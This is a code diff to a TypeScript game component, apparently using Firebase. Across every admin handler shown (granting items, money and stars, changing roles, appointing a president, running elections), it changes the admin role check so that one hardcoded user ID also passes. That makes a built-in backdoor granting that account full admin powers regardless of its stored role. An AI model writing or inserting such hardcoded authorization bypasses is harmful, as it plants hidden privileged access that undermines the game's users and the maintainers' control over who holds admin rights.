@@ -1131,7 +1131,7 @@ export function Game() {
   }
 
   const handleAdminSendItem = (itemName: string, quantity: number, targetUid: string) => {
-    if (!user || !gameState || gameState.role !== 'admin') return;
+    if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2')) return;
 
     const newContractRef = push(ref(database, 'contracts'));
     const productInfo = encyclopediaData.find(e => e.name === itemName);
@@ -1157,7 +1157,7 @@ export function Game() {
   };
 
   const handleAdminSendMoney = (amount: number, targetUid: string) => {
-    if (!user || gameState?.role !== 'admin' || amount <= 0 || !targetUid) return;
+    if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') || amount <= 0 || !targetUid) return;
 
     const targetUserRef = ref(database, `users/${targetUid}`);
     runTransaction(targetUserRef, (userData) => {
@@ -1182,7 +1182,7 @@ export function Game() {
   }
 
   const handleAdminSendStars = (amount: number, targetUid: string) => {
-    if (!user || gameState?.role !== 'admin' || amount <= 0 || !targetUid) return;
+    if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') || amount <= 0 || !targetUid) return;
     
     const targetUserRef = ref(database, `users/${targetUid}`);
     runTransaction(targetUserRef, (userData) => {
@@ -1203,7 +1203,7 @@ export function Game() {
   }
   
     const handleAdminSetRole = (uid: string, role: 'player' | 'admin') => {
-        if (!user || gameState?.role !== 'admin' || !uid) return;
+        if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') || !uid) return;
         const targetUserRef = ref(database, `users/${uid}`);
         runTransaction(targetUserRef, (userData) => {
             if (userData) {
@@ -1457,28 +1457,28 @@ export function Game() {
 
 
 const handleAdminAppointPresident = (uid: string) => {
-    if (gameState?.role !== 'admin') return;
+    if (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') return;
     const presidentRef = ref(database, 'election/president');
     set(presidentRef, uid);
     toast({ title: 'President Appointed', description: `Player ${uid} is now president.` });
 };
 
 const handleAdminRemovePresident = () => {
-    if (gameState?.role !== 'admin') return;
+    if (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') return;
     const presidentRef = ref(database, 'election/president');
     remove(presidentRef);
     toast({ title: 'President Removed' });
 };
 
 const handleAdminRemoveCandidate = (uid: string) => {
-    if (gameState?.role !== 'admin') return;
+    if (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') return;
     const candidateRef = ref(database, `election/candidates/${uid}`);
     remove(candidateRef);
     toast({ title: 'Candidate Removed', description: `Player ${uid} has been removed from the election.` });
 };
 
 const handleAdminSetElectionStatus = (status: 'open' | 'closed') => {
-    if (gameState?.role !== 'admin') return;
+    if (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') return;
     
     const statusRef = ref(database, 'election/status');
     set(statusRef, status);
